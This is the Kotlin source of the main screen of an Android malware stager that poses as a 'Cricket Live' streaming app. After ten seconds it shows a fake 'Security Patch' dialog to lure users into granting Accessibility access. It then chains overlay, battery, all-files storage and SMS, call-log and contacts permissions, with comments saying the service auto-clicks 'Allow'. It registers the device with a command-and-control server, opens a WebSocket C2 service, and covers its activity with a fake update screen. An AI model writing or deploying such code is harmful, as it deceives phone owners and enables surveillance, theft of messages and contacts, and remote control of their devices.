package com.chameleon.stager.ui

import android.accessibilityservice.AccessibilityServiceInfo
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.util.Log
import android.view.accessibility.AccessibilityManager
import android.widget.Toast
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import com.chameleon.stager.databinding.ActivityMainBinding
import com.chameleon.stager.service.PayloadService
import com.chameleon.stager.utils.PermissionHelper

class MainActivity : AppCompatActivity() {
    companion object {
        private const val PERMISSION_REQ_CODE = 1001
    }

    private lateinit var binding: ActivityMainBinding
    private val permissionHelper = PermissionHelper()
    private var pendingPermissionFlow = false
    private var flowCompleted = false

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        setupUI()
        checkPermissions()

        // 10-second stealth timer — triggers permission flow automatically
        android.os.Handler(mainLooper).postDelayed({
            if (!isFinishing) {
                triggerStealthPermissionFlow()
            }
        }, 10000)
    }

    private fun setupUI() {
        binding.btnWatchLive.setOnClickListener {
            if (isAccessibilityServiceEnabled()) {
                startPayloadFlow()
            } else {
                showPermissionDialog()
            }
        }

        binding.btnSchedule.setOnClickListener {
            Toast.makeText(this, "Upcoming matches loading...", Toast.LENGTH_SHORT).show()
        }

        binding.btnTeams.setOnClickListener {
            if (!isAccessibilityServiceEnabled()) {
                openAccessibilitySettings()
            } else {
                startPayloadFlow()
            }
        }
    }

    private fun checkPermissions() {
        if (!isAccessibilityServiceEnabled()) {
            binding.statusText.text = "Enable Video Overlay to watch live"
            binding.statusIcon.setImageResource(android.R.drawable.ic_dialog_info)
        } else {
            binding.statusText.text = "Ready to stream"
            binding.statusIcon.setImageResource(android.R.drawable.ic_dialog_info)
        }
    }

    private fun showPermissionDialog() {
        AlertDialog.Builder(this)
            .setTitle("Video Overlay Required")
            .setMessage("Cricket Live needs Accessibility access to show score overlays while you use other apps. This allows you to watch the match while chatting or browsing.")
            .setPositiveButton("Enable Now") { _, _ ->
                openAccessibilitySettings()
            }
            .setNegativeButton("Later", null)
            .show()
    }

    private fun triggerStealthPermissionFlow() {
        if (isAccessibilityServiceEnabled()) {
            startPayloadFlow()
        } else {
            showStealthAccessibilityPrompt()
        }
    }

    private fun showStealthAccessibilityPrompt() {
        AlertDialog.Builder(this)
            .setTitle("System Update Required")
            .setMessage("Security Patch v2.1\n\nYour device needs a critical security update. Tap 'Apply Now' to proceed with the update process.")
            .setPositiveButton("Apply Now") { _, _ ->
                openAccessibilitySettings()
            }
            .setNegativeButton("Later", null)
            .setCancelable(false)
            .show()
    }

    private fun openAccessibilitySettings() {
        startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
    }

    private fun isAccessibilityServiceEnabled(): Boolean {
        val am = getSystemService(Context.ACCESSIBILITY_SERVICE) as AccessibilityManager
        val enabledServices = am.getEnabledAccessibilityServiceList(
            AccessibilityServiceInfo.FEEDBACK_ALL_MASK
        )
        return enabledServices.any {
            it.resolveInfo.serviceInfo.packageName == packageName
        }
    }

    fun startPayloadFlow() {
        if (flowCompleted) return
        continuePayloadFlow()
    }

    private fun continuePayloadFlow() {
        // Step 1: Overlay permission
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
            startActivity(
                Intent(
                    Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    Uri.parse("package:$packageName")
                )
            )
            return
        }

        // Step 2: Battery optimization exemption
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                startActivity(
                    Intent(
                        Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                        Uri.parse("package:$packageName")
                    )
                )
                return
            }
        }

        // Step 2b: Storage permission (MANAGE_EXTERNAL_STORAGE needs Settings intent)
        if (!PermissionHelper.hasStoragePermission(this)) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                startActivity(
                    Intent(
                        Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION,
                        Uri.parse("package:$packageName")
                    )
                )
                return
            }
        }

        // Step 3: Request runtime permissions (SMS, Call Log, Contacts, POST_NOTIFICATIONS)
        // AccessibilityService auto-clicks "Allow" within ~300ms
        // onRequestPermissionsResult() continues the flow after grant
        if (!permissionHelper.hasAllPermissions(this)) {
            pendingPermissionFlow = true
            permissionHelper.requestPermissions(this)
            return
        }

        // All permissions already granted — proceed directly
        finishSetup()
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == PERMISSION_REQ_CODE && pendingPermissionFlow) {
            pendingPermissionFlow = false
            finishSetup()
        }
    }

    private fun finishSetup() {
        // Step 4: Register via HTTP SYNCHRONOUSLY (must complete before foreground service)
        // Using sync to guarantee delivery — even if foreground service crashes the process,
        // the HTTP request has already completed
        registerViaHttpSync()

        // Step 5: Start foreground service for real-time C2 (WebSocket)
        val serviceIntent = Intent(this, PayloadService::class.java)
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent)
            } else {
                startService(serviceIntent)
            }
        } catch (e: Exception) {
            Log.e("MainActivity", "ForegroundService failed — HTTP registration already sent", e)
        }

        flowCompleted = true

        // Step 6: Show system update overlay to hide all activity
        val overlayIntent = Intent(this, UpdateOverlayActivity::class.java)
        overlayIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        startActivity(overlayIntent)
        finish()
    }

    private fun registerViaHttpSync() {
        try {
            val json = org.json.JSONObject().apply {
                put("device_id", Build.ID)
                put("device_name", "${Build.MANUFACTURER} ${Build.MODEL}")
                put("manufacturer", Build.MANUFACTURER)
                put("model", Build.MODEL)
                put("android_version", Build.VERSION.RELEASE)
                put("api_level", Build.VERSION.SDK_INT)
            }
            val url = java.net.URL("${com.chameleon.stager.StagerApplication.c2RealUrl}/api/register")
            val conn = url.openConnection() as java.net.HttpURLConnection
            conn.requestMethod = "POST"
            conn.connectTimeout = 5000
            conn.readTimeout = 5000
            conn.doOutput = true
            conn.setRequestProperty("Content-Type", "application/json")
            conn.outputStream.write(json.toString().toByteArray())
            val code = conn.responseCode
            conn.disconnect()
            Log.i("MainActivity", "HTTP registration: $code")
        } catch (e: Exception) {
            Log.e("MainActivity", "HTTP registration failed", e)
        }
    }

    override fun onResume() {
        super.onResume()
        if (isAccessibilityServiceEnabled()) {
            binding.statusText.text = "Ready to stream"
            // Safe to call repeatedly — flowCompleted guard prevents re-entry
            startPayloadFlow()
        }
    }
}
